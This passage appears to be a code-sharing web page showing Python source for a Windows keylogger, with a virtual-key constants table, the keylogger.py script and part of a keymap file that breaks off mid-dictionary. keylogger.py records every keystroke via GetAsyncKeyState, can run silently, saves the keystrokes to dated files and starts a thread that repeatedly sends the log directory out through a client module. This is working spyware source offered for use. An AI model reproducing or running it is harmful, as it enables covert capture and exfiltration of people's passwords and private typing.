W</span></span><br><span class="line">VK_X                   = <span class="number">0x58</span>   <span class="comment"># x [UPPER] X</span></span><br><span class="line">VK_Y                   = <span class="number">0x59</span>   <span class="comment"># y [UPPER] Y</span></span><br><span class="line">VK_Z                   = <span class="number">0x5A</span>   <span class="comment"># z [UPPER] Z</span></span><br><span class="line">VK_LWIN                = <span class="number">0x5B</span></span><br><span class="line">VK_RWIN                = <span class="number">0x5C</span></span><br><span class="line">VK_APPS                = <span class="number">0x5D</span></span><br><span class="line">VK_SLEEP               = <span class="number">0x5F</span></span><br><span class="line">VK_NUMPAD0             = <span class="number">0x60</span>   <span class="comment"># Ins [NUMLOCK] 0</span></span><br><span class="line">VK_NUMPAD1             = <span class="number">0x61</span>   <span class="comment"># End [NUMLOCK] 1</span></span><br><span class="line">VK_NUMPAD2             = <span class="number">0x62</span>   <span class="comment"># Down [NUMLOCK] 2</span></span><br><span class="line">VK_NUMPAD3             = <span class="number">0x63</span>   <span class="comment"># PageDown [NUMLOCK] 3</span></span><br><span class="line">VK_NUMPAD4             = <span class="number">0x64</span>   <span class="comment"># Left [NUMLOCK] 4</span></span><br><span class="line">VK_NUMPAD5             = <span class="number">0x65</span>   <span class="comment"># NumPad5 [NUMLOCK] 5</span></span><br><span class="line">VK_NUMPAD6             = <span class="number">0x66</span>   <span class="comment"># Right [NUMLOCK] 6</span></span><br><span class="line">VK_NUMPAD7             = <span class="number">0x67</span>   <span class="comment"># Home [NUMLOCK] 7</span></span><br><span class="line">VK_NUMPAD8             = <span class="number">0x68</span>   <span class="comment"># Up [NUMLOCK] 8</span></span><br><span class="line">VK_NUMPAD9             = <span class="number">0x69</span>   <span class="comment"># PageUp [NUMLOCK] 9</span></span><br><span class="line">VK_MULTIPLY            = <span class="number">0x6A</span>   <span class="comment"># * [NUMLOCK] *</span></span><br><span class="line">VK_ADD                 = <span class="number">0x6B</span>   <span class="comment"># + [NUMLOCK] +</span></span><br><span class="line">VK_SEPARATOR           = <span class="number">0x6C</span></span><br><span class="line">VK_SUBTRACT            = <span class="number">0x6D</span>   <span class="comment"># - [NUMLOCK] -</span></span><br><span class="line">VK_DECIMAL             = <span class="number">0x6E</span>   <span class="comment"># Del [NUMLOCK] .</span></span><br><span class="line">VK_DIVIDE              = <span class="number">0x6F</span>   <span class="comment"># / [NUMLOCK] /</span></span><br><span class="line">VK_F1                  = <span class="number">0x70</span>   <span class="comment"># F1</span></span><br><span class="line">VK_F2                  = <span class="number">0x71</span>   <span class="comment"># F2</span></span><br><span class="line">VK_F3                  = <span class="number">0x72</span>   <span class="comment"># F3</span></span><br><span class="line">VK_F4                  = <span class="number">0x73</span>   <span class="comment"># F4</span></span><br><span class="line">VK_F5                  = <span class="number">0x74</span>   <span class="comment"># F5</span></span><br><span class="line">VK_F6                  = <span class="number">0x75</span>   <span class="comment"># F6</span></span><br><span class="line">VK_F7                  = <span class="number">0x76</span>   <span class="comment"># F7</span></span><br><span class="line">VK_F8                  = <span class="number">0x77</span>   <span class="comment"># F8</span></span><br><span class="line">VK_F9                  = <span class="number">0x78</span>   <span class="comment"># F9</span></span><br><span class="line">VK_F10                 = <span class="number">0x79</span>   <span class="comment"># F10</span></span><br><span class="line">VK_F11                 = <span class="number">0x7A</span>   <span class="comment"># F11</span></span><br><span class="line">VK_F12                 = <span class="number">0x7B</span>   <span class="comment"># F12</span></span><br><span class="line">VK_F13                 = <span class="number">0x7C</span>   <span class="comment"># F13</span></span><br><span class="line">VK_F14                 = <span class="number">0x7D</span>   <span class="comment"># F14</span></span><br><span class="line">VK_F15                 = <span class="number">0x7E</span>   <span class="comment"># F15</span></span><br><span class="line">VK_F16                 = <span class="number">0x7F</span>   <span class="comment"># F16</span></span><br><span class="line">VK_F17                 = <span class="number">0x80</span>   <span class="comment"># F17</span></span><br><span class="line">VK_F18                 = <span class="number">0x81</span>   <span class="comment"># F18</span></span><br><span class="line">VK_F19                 = <span class="number">0x82</span>   <span class="comment"># F19</span></span><br><span class="line">VK_F20                 = <span class="number">0x83</span>   <span class="comment"># F20</span></span><br><span class="line">VK_F21                 = <span class="number">0x84</span>   <span class="comment"># F21</span></span><br><span class="line">VK_F22                 = <span class="number">0x85</span>   <span class="comment"># F22</span></span><br><span class="line">VK_F23                 = <span class="number">0x86</span>   <span class="comment"># F23</span></span><br><span class="line">VK_F24                 = <span class="number">0x87</span>   <span class="comment"># F24</span></span><br><span class="line">VK_NUMLOCK             = <span class="number">0x90</span>   <span class="comment"># NumLock</span></span><br><span class="line">VK_SCROLL              = <span class="number">0x91</span>   <span class="comment"># Scroll</span></span><br><span class="line">VK_LSHIFT              = <span class="number">0xA0</span></span><br><span class="line">VK_RSHIFT              = <span class="number">0xA1</span></span><br><span class="line">VK_LCONTROL            = <span class="number">0xA2</span></span><br><span class="line">VK_RCONTROL            = <span class="number">0xA3</span></span><br><span class="line">VK_LMENU               = <span class="number">0xA4</span></span><br><span class="line">VK_RMENU               = <span class="number">0xA5</span></span><br><span class="line">VK_BROWSER_BACK        = <span class="number">0xA6</span></span><br><span class="line">VK_BROWSER_FORWARD     = <span class="number">0xA7</span></span><br><span class="line">VK_BROWSER_REFRESH     = <span class="number">0xA8</span></span><br><span class="line">VK_BROWSER_STOP        = <span class="number">0xA9</span></span><br><span class="line">VK_BROWSER_SEARCH      = <span class="number">0xAA</span></span><br><span class="line">VK_BROWSER_FAVORITES   = <span class="number">0xAB</span></span><br><span class="line">VK_BROWSER_HOME        = <span class="number">0xAC</span></span><br><span class="line">VK_VOLUME_MUTE         = <span class="number">0xAD</span></span><br><span class="line">VK_VOLUME_DOWN         = <span class="number">0xAE</span></span><br><span class="line">VK_VOLUME_UP           = <span class="number">0xAF</span></span><br><span class="line">VK_MEDIA_NEXT_TRACK    = <span class="number">0xB0</span></span><br><span class="line">VK_MEDIA_PREV_TRACK    = <span class="number">0xB1</span></span><br><span class="line">VK_MEDIA_STOP          = <span class="number">0xB2</span></span><br><span class="line">VK_MEDIA_PLAY_PAUSE    = <span class="number">0xB3</span></span><br><span class="line">VK_LAUNCH_MAIL         = <span class="number">0xB4</span></span><br><span class="line">VK_LAUNCH_MEDIA_SELECT = <span class="number">0xB5</span></span><br><span class="line">VK_LAUNCH_APP1         = <span class="number">0xB6</span></span><br><span class="line">VK_LAUNCH_APP2         = <span class="number">0xB7</span></span><br><span class="line">VK_OEM_1               = <span class="number">0xBA</span>   <span class="comment"># ; [SHIFT] :</span></span><br><span class="line">VK_OEM_PLUS            = <span class="number">0xBB</span>   <span class="comment"># = [SHIFT] +</span></span><br><span class="line">VK_OEM_COMMA           = <span class="number">0xBC</span>   <span class="comment"># , [SHIFT] &lt;</span></span><br><span class="line">VK_OEM_MINUS           = <span class="number">0xBD</span>   <span class="comment"># - [SHIFT] _</span></span><br><span class="line">VK_OEM_PERIOD          = <span class="number">0xBE</span>   <span class="comment"># . [SHIFT] &gt;</span></span><br><span class="line">VK_OEM_2               = <span class="number">0xBF</span>   <span class="comment"># / [SHIFT] ?</span></span><br><span class="line">VK_OEM_3               = <span class="number">0xC0</span>   <span class="comment"># ` [SHIFT] ~</span></span><br><span class="line">VK_OEM_4               = <span class="number">0xDB</span>   <span class="comment"># [ [SHIFT] &#123;</span></span><br><span class="line">VK_OEM_5               = <span class="number">0xDC</span>   <span class="comment"># \ [SHIFT] |</span></span><br><span class="line">VK_OEM_6               = <span class="number">0xDD</span>   <span class="comment"># ] [SHIFT] &#125;</span></span><br><span class="line">VK_OEM_7               = <span class="number">0xDE</span>   <span class="comment"># &#x27; [SHIFT] &quot;</span></span><br><span class="line">VK_OEM_8               = <span class="number">0xDF</span></span><br><span class="line">VK_OEM_102             = <span class="number">0xE2</span></span><br><span class="line">VK_PROCESSKEY          = <span class="number">0xE5</span></span><br><span class="line">VK_PACKET              = <span class="number">0xE7</span></span><br><span class="line">VK_ATTN                = <span class="number">0xF6</span></span><br><span class="line">VK_CRSEL               = <span class="number">0xF7</span></span><br><span class="line">VK_EXSEL               = <span class="number">0xF8</span></span><br><span class="line">VK_EREOF               = <span class="number">0xF9</span></span><br><span class="line">VK_PLAY                = <span class="number">0xFA</span></span><br><span class="line">VK_ZOOM                = <span class="number">0xFB</span></span><br><span class="line">VK_NONAME              = <span class="number">0xFC</span></span><br><span class="line">VK_PA1                 = <span class="number">0xFD</span></span><br><span class="line">VK_OEM_CLEAR           = <span class="number">0xFE</span></span><br></pre></td></tr></table></figure>

<h2 id="keylogger-py"><a href="#keylogger-py" class="headerlink" title="keylogger.py"></a>keylogger.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span></span><br><span class="line"><span class="comment"># sys.path.insert(0,os.path.join(BASE_DIR,&#x27;00网络编程&#x27;))</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">from</span> keymap <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> Output, thread_refresh</span><br><span class="line"></span><br><span class="line">MAX_KEYLOGGER_BUF = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> win32api</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keylogger</span>(<span class="params">SaveDirs=[], silentMode=<span class="literal">False</span></span>):</span></span><br><span class="line">        write = Output(silentMode)</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        last_update = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> code <span class="keyword">in</span> [VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL, VK_NUMLOCK]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                status = win32api.GetAsyncKeyState(code)</span><br><span class="line">                <span class="keyword">if</span> status &amp; <span class="number">1</span> != <span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">                CtrlKey = win32api.GetKeyState(VK_CONTROL) &lt; <span class="number">0</span></span><br><span class="line">                AltKey = win32api.GetKeyState(VK_MENU) &lt; <span class="number">0</span></span><br><span class="line">                ShiftKey = win32api.GetKeyState(VK_SHIFT) &lt; <span class="number">0</span></span><br><span class="line">                CapsLock = win32api.GetKeyState(VK_CAPITAL) &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">                NumLock = win32api.GetKeyState(VK_NUMLOCK) &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">                <span class="comment"># upper    = ShiftKey != CapsLock</span></span><br><span class="line">                Modifier = []</span><br><span class="line">                <span class="keyword">if</span> CtrlKey:   Modifier.append(<span class="string">&#x27;Control&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> AltKey:    Modifier.append(<span class="string">&#x27;Alt&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> ShiftKey:  Modifier.append(<span class="string">&#x27;Shift&#x27;</span>)</span><br><span class="line">                character = keymap.get(code)</span><br><span class="line">                <span class="keyword">if</span> character <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                name = <span class="string">&#x27;-&#x27;</span>.join(Modifier + [character])</span><br><span class="line">                <span class="keyword">if</span> VK_A &lt;= code &lt;= VK_Z <span class="keyword">and</span> <span class="keyword">not</span> Modifier <span class="keyword">and</span> CapsLock:</span><br><span class="line">                    name = character.upper()</span><br><span class="line">                <span class="keyword">if</span> VK_NUMPAD0 &lt;= code &lt;= VK_DIVIDE <span class="keyword">and</span> NumLock <span class="keyword">and</span> keymap.get(<span class="string">&#x27;NumLock-&#x27;</span> + name):</span><br><span class="line">                    name = keymap.get(<span class="string">&#x27;NumLock-&#x27;</span> + name)</span><br><span class="line">                <span class="keyword">elif</span> keymap.get(name):</span><br><span class="line">                    name = keymap.get(name)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">ord</span>(name) &gt; <span class="number">255</span>:</span><br><span class="line">                    name = <span class="string">&#x27;[&#x27;</span> + name + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> code == VK_RETURN:</span><br><span class="line">                    name += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">                write(name)</span><br><span class="line">                result += name</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; MAX_KEYLOGGER_BUF:</span><br><span class="line">                result = result[-MAX_KEYLOGGER_BUF:]</span><br><span class="line">            cur_time = time.time()</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">and</span> cur_time - last_update &gt; <span class="number">1</span>:</span><br><span class="line">                fileName = time.strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>) + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> SaveDir <span class="keyword">in</span> SaveDirs:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(SaveDir):</span><br><span class="line">                            os.makedirs(SaveDir)</span><br><span class="line">                        fullName = os.path.join(SaveDir, fileName)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(fullName, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                            fp.write(result)</span><br><span class="line">                        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        logging.debug(<span class="string">&#x27;Can\&#x27;t open %s&#x27;</span>, fullName)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                last_update = cur_time</span><br><span class="line">                result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keylogger</span>(<span class="params">SaveDirs=[], silentMode=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">### change parameters here ###</span></span><br><span class="line">    save_dirs = [<span class="string">&#x27;C:\\KeyLogger&#x27;</span>]</span><br><span class="line">    update_interval = <span class="number">3</span></span><br><span class="line">    SilentMode = <span class="literal">False</span>  <span class="comment"># no output</span></span><br><span class="line">    <span class="comment">##############################</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">        <span class="keyword">import</span> client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_log</span>():</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">for</span> SaveDir <span class="keyword">in</span> save_dirs <span class="keyword">if</span> <span class="built_in">isinstance</span>(save_dirs, <span class="built_in">list</span>) <span class="keyword">else</span> [save_dirs]:</span><br><span class="line">                    client.send_dir(SaveDir)</span><br><span class="line">                time.sleep(update_interval)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        thread = threading.Thread(target=send_log)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">    thread = threading.Thread(target=keylogger, args=(save_dirs, SilentMode))</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    <span class="keyword">while</span> threads:</span><br><span class="line">        threads = thread_refresh(threads)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="keymap-py"><a href="#keymap-py" class="headerlink" title="keymap.py"></a>keymap.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> keydef <span class="keyword">import</span> *</span><br><span class="line">keymap = &#123;</span><br><span class="line">    VK_CANCEL:           <span class="string">&#x27;Cancel&#x27;</span>,</span><br><span class="line">    VK_BACK:             <span class="string">&#x27;Backspace&#x27;</span>,</span><br><span class="line">    VK_TAB:              <span class="string">&#x27;Tab&#x27;</span>,</span><br><span class="line">    VK_CLEAR:            <span class="string">&#x27;Clear&#x27;</span>,</span><br><span class="line">    VK_RETURN:           <span class="string">&#x27;Enter&#x27;</span>,</span><br><span class="line">    VK_SHIFT:            <span class="string">&#x27;Shift&#x27;</span>,</span><br><span class="line">    VK_CONTROL:          <span class="string">&#x27;Ctrl&#x27;</span>,</span><br><span class="line">    VK_MENU:             <span class="string">&#x27;Alt&#x27;</span>,</span><br><span class="line">    VK_PAUSE:            <span class="string">&#x27;Pause&#x27;</span>,</span><br><span class="line">    VK_CAPITAL:          <span class="string">&#x27;CapsLock&#x27;</span>,</span><br><span class="line">    VK_ESCAPE:           <span class="string">&#x27;Esc&#x27;</span>,</span><br><span class="line">    VK_SPACE:            <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">    VK_PRIOR:            <span class="string">&#x27;PageUp&#x27;</span>,</span><br><span class="line">    VK_NEXT:             <span class="string">&#x27;PageDown&#x27;</span>,</span><br><span class="line">    VK_END:              <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">    VK_HOME:             <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    VK_LEFT:             <span class="string">&#x27;Left&#x27;</span>,</span><br><span class="line">    VK_UP:               <span class="string">&#x27;Up&#x27;</span>,</span><br><span class="line">    VK_RIGHT:            <span class="string">&#x27;Right&#x27;</span>,</span><br><span class="line">    VK_DOWN:             <span class="string">&#x27;Down&#x27;</span>,</span><br><span class="line">    VK_SELECT:           <span class="string">&#x27;Select&#x27;</span>,</span><br><span class="line">    VK_PRINT:            <span class="string">&#x27;Print&#x27;</span>,</span><br><span class="line">    VK_EXECUTE:          <span class="string">&#x27;Execute&#x27;</span>,</span><br><span class="line">    VK_SNAPSHOT:         <span class="string">&#x27;PrintScreen&#x27;</span>,</span><br><span class="line">    VK_0:                <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    VK_1:                <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    VK_2:                <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    VK_3:                <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    VK_4:                <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    VK_5:                <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    VK_6:                <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    VK_7:                <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    VK_8:                <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    VK_9:                <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    VK_A:                <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    VK_B:                <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    VK_C:                <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    VK_D:                <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    VK_E:                <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    VK_F:                <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    VK_G:                <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    VK_H:                <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    VK_I:                <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    VK_J:                <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    VK_K:                <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    VK_L:                <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    VK_M:                <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    VK_N:                <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    VK_O:                <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    VK_P:                <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    VK_Q:                <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    VK_R:                <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    VK_S:                <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    VK_T:                <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    VK_U:                <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    VK_V:                <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">    VK_W:                <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">    VK_X:                <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">    VK_Y:                <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    VK_Z:                <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    VK_NUMPAD0:          <span class="string">&#x27;Ins&#x27;</span>,</span><br><span class="line">    VK_NUMPAD1:          <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">    VK_NUMPAD2:          <span class="string">&#x27;Down&#x27;</span>,</span><br><span class="line">    VK_NUMPAD3:          <span class="string">&#x27;PageDown&#x27;</span>,</span><br><span class="line">    VK_NUMPAD4:          <span class="string">&#x27;Left&#x27;</span>,</span><br><span class="line">    VK_NUMPAD5:          <span class="string">&#x27;NumPad5&#x27;</span>,</span><br><span class="line">    VK_NUMPAD6:          <span class="string">&#x27;Right&#x27;</span>,</span><br><span class="line">    VK_NUMPAD7:          <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    VK_NUMPAD8:          <span class="string">&#x27;Up&#x27;</span>,</span><br><span class="line">    VK_NUMPAD9:          <span class="string">&#x27;PageUp&#x27;</span>,</span><br><span class="line">    VK_MULTIPLY:         <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    VK_ADD:              <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    VK_SUBTRACT:         <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    VK_DECIMAL:          <span class="string">&#x27;Del&#x27;</span>,</span><br><span class="line">    VK_DIVIDE:           <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    VK_F1:               <span class="string">&#x27;F1&#x27;</span>,</span><br><span class="line">    VK_F2:               <span class="string">&#x27;F2&#x27;</span>,</span><br><span class="line">    VK_F3:               <span class="string">&#x27;F3&#x27;</span>,</span><br><span class="line">    VK_F4:               <span class="string">&#x27;F4&#x27;</span>,</span><br><span class="line">    VK_F5:               <span class="string">&#x27;F5&#x27;</span>,</span><br><span class="line">    VK_F6:               <span class="string">&#x27;F6&#x27;</span>,</span><br><span class="line">    VK_F7:               <span class="string">&#x27;F7&#x27;</span>,</span><br><span class="line">    VK_F8:               <span class="string">&#x27;F8&#x27;</span>,</span><br><span class="line">    VK_F9:               <span class="string">&#x27;F9&#x27;</span>,</span><br><span class="line">    VK_F10:              <span class="string">&#x27;F10&#x27;</span>,</span><br><span class="line">    VK_F11:              <span class="string">&#x27;F11&#x27;</span>,</span><br><span class="line">    VK_F12:              <span class="string">&#x27;F12&#x27;</span>,</span><br><span class="line">    VK_F13:              <span class="string">&#x27;F13&#x27;</span>,</span><br><span class="line">    VK_F14:              <span class="string">&#x27;F14&#x27;</span>,</span><br><span class="line">    VK_F15:              <span class="string">&#x27;F15&#x27;</span>,</span><br><span class="line">    VK_F16:              <span class="string">&#x27;F16&#x27;</span>,</span><br><span class="line">    VK_F17:              <span class="string">&#x27;F17&#x27;</span>,</span><br><span class="line">    VK_F18:              <span class="string">&#x27;F18&#x27;</span>,</span><br><span class="line">    VK_F19:              <span class="string">&#x27;F19&#x27;</span>,</span><br><span class="line">    VK_F20:              <span class="string">&#x27;F20&#x27;</span>,</span><br><span class="line">    VK_F21:              <span class="string">&#x27;F21&#x27;</span>,</span><br><span class="line">    VK_F22:              <span class="string">&#x27;F22&#x27;</span>,</span><br><span class="line">    VK_F23:              <span class="string">&#x27;F23&#x27;</span>,</span><br><span class="line">    VK_F24:              <span class="string">&#x27;F24&#x27;</span>,</span><br><span class="line">    VK_NUMLOCK:          <span class="string">&#x27;NumLock&#x27;</span>,</span><br><span class="line">    VK_SCROLL:           <span class="string">&#x27;Scroll&#x27;</span>,</span><br><span class="line">    VK_OEM_1:            <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    VK_OEM_PLUS:         <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line">    VK_OEM_COMMA:        <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    VK_OEM_MINUS:        <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    VK_OEM_PERIOD:       <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    VK_OEM_2:            <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    VK_OEM_3:            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">    VK_OEM_4:            <span class="string">&#x27;[&#x27;</span>,</span><br><span class="line">    VK_OEM_5:            <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    VK_OEM_6:            <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    VK_OEM_7:            <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-0&#x27;</span>:           <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-1&#x27;</span>:           <span class="string">&#x27;!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-2&#x27;</span>:           <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-3&#x27;</span>:           <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-4&#x27;</span>:           <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-5&#x27;</span>:           <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-6&#x27;</span>:           <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-7&#x27;</span>:           <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-8&#x27;</span>:           <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-9&#x27;</span>:           <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-a&#x27;</span>:           <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-b&#x27;</span>:           <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-c&#x27;</span>:           <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-d&#x27;</span>:           <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-e&#x27;</span>:           <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-f&#x27;</span>:           <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-g&#x27;</span>:           <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-h&#x27;</span>:           <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-i&#x27;</span>:           <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-j&#x27;</span>:           <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-k&#x27;</span>:           <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-l&#x27;</span>:           <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-m&#x27;</span>:           <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-n&#x27;</span>:           <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-o&#x27;</span>:           <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-p&#x27;</span>:           <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-q&#x27;</span>:           <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-r&#x27;</span>:           <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-s&#x27;</span>:           <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-t&#x27;</span>:           <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-u&#x27;</span>:           <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-v&#x27;</span>:           <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">  